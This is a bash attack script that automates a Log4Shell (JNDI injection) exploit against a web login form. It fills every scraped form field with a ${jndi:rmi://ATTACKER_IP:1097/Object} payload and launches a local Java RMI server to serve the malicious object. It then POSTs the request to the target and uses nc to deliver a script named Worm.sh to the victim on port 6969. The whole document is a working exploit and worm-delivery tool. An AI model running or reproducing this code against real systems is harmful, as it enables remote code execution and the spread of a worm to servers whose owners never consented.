#!/bin/bash

if [ $# -ne 4 ]
then
	echo "Usage: ./Master_script.sh LOGIN_PAGE TARGET_URL SCRIPT_REMOTE_EXECUTION ATTACKER_IP"
	echo "Eg: ./Master_script.sh localhost:8080 localhost:8080/login Worm.sh localhost"
	exit -1
fi

JAVA_RMI_SERVER_LOCATION=`pwd` # OVERWRITE IT

LOGIN_PAGE=$1
TARGET_URL=$2
SCRIPT=$3
ATTACKER_IP=$4

# curl $LOGIN_PAGE > login.html

list=`curl $LOGIN_PAGE | awk "/<input/,/>/" | grep -Po "name=\"\K[^\"]*"`
# list=`curl $LOGIN_PAGE | awk '/<input/,/>/' | grep -Po 'name="\K[^"]*'`

malicious_user="%24%7Bjndi%3Armi%3A%2F%2F$ATTACKER_IP%3A1097%2FObject%7D" # ${jndi:rmi://localhost:1097/Object}

str_req=""

for element in $list
do
	new_field="${element}=$malicious_user"
	if [ ! -z "$str_req" ]
	then
		str_req="${str_req}&"
	fi
	str_req="${str_req}${new_field}"

done

# echo $str_req

# Start the attack itself:

cd $JAVA_RMI_SERVER_LOCATION ; /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -cp tomcat-catalina-8.5.83.jar:. File & # as a child shell
JAVA_PID=$! # Special bash command

sleep 4 # Wait for the RMI server to be set up, otherwise it fails

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d $str_req $TARGET_URL

# sleep 4 # We have to wait for nc. IF the next nc is executed after the listener in the victim, the following nc won't connect.

nc_exit_code=1

iterations=0

TARGET_IP=$(echo -n $(echo -n "${LOGIN_PAGE#*://}") | cut -d ':' -f 1 | rev | cut -d '/' -f 1 | rev)

while [ "$nc_exit_code" -ne 0 ] && [ $iterations -lt 20 ]; do
	sleep 4
	if [ "`readlink /etc/alternatives/nc`" == "/bin/nc.openbsd" ]; then 
		echo "ATTACKER_IP=$TARGET_IP;" | cat - $SCRIPT | nc -q 0 $TARGET_IP 6969
	else
		echo "ATTACKER_IP=$TARGET_IP;" | cat - $SCRIPT | nc $TARGET_IP 6969
	fi
	nc_exit_code=$?
	iterations=$((iterations + 1))
done

kill -kill $JAVA_PID












